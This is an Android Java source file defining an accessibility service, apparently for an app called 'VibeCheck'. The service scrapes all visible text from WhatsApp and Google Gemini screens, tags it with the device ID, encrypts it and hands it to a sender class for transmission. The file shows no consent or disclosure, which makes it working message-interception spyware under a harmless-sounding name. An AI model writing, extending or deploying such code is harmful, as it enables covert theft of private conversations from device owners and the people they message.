package app.lovable.cb70405bb9cf47f6aac54784c26796c4.services;

import android.accessibilityservice.AccessibilityService;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.AESEncryptor;
import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.MessageSender;

import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class VibeCheckAccessibilityService extends AccessibilityService {

    private static final String TAG = "VibeCheckA11y";
    private static final String WHATSAPP_PKG = "com.whatsapp";
    private static final String GEMINI_PKG = "com.google.android.apps.bard";

    // Track recently seen messages to avoid duplicates
    private final Set<String> recentMessages = new HashSet<>();
    private static final int MAX_CACHE_SIZE = 500;

    private String deviceId;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d(TAG, "Accessibility service connected, device: " + deviceId);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        Log.d(TAG, "EVENT received: type=" + event.getEventType() + " pkg=" + event.getPackageName());

        CharSequence pkgName = event.getPackageName();
        if (pkgName == null) return;

        String pkg = pkgName.toString();
        if (!pkg.equals(WHATSAPP_PKG) && !pkg.equals(GEMINI_PKG)) return;

        int eventType = event.getEventType();
        // Process content change and window content change events for new messages
        if (eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            eventType != AccessibilityEvent.TYPE_VIEW_SCROLLED) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            extractMessages(rootNode, pkg);
            Log.d(TAG, "Finished extracting from " + pkg);
        } finally {
            rootNode.recycle();
        }
    }

    private void extractMessages(AccessibilityNodeInfo node, String pkg) {
        if (node == null) return;

        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            String message = text.toString().trim();
            // Skip very short or UI-element text
            if (message.length() > 2 && !recentMessages.contains(message)) {
                Log.d(TAG, "NEW MSG [" + pkg + "]: " + message.substring(0, Math.min(message.length(), 50)));
                // Evict old entries if cache is too large
                if (recentMessages.size() >= MAX_CACHE_SIZE) {
                    recentMessages.clear();
                }
                recentMessages.add(message);
                sendEncrypted(message, pkg);
            }
        }

        // Recurse into children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                try {
                    extractMessages(child, pkg);
                } finally {
                    child.recycle();
                }
            }
        }
    }

    private void sendEncrypted(String message, String pkg) {
        try {
            String appName = pkg.equals(WHATSAPP_PKG) ? "whatsapp" : "gemini";
            String[] result = AESEncryptor.encrypt(message);
            MessageSender.send(this, deviceId, appName, result[0], result[1], System.currentTimeMillis());
            Log.d(TAG, "Sent encrypted message from " + appName);
        } catch (Exception e) {
            Log.e(TAG, "Encryption/send failed", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
}
